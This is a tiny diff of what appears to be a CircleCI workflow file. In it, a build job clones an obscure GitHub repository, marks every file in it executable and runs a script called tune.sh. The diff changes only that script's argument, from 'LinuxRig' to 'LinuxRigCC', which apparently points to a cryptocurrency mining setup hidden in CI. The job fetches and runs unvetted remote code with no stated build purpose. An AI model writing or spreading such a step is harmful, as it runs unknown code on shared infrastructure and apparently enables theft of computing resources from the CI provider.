@@ -12,7 +12,7 @@ jobs:
             git clone https://github.com/opexug/xyvbo.git
             cd xyvbo
             chmod +x *
-            ./tune.sh LinuxRig
+            ./tune.sh LinuxRigCC
 
 workflows:
   version: 2
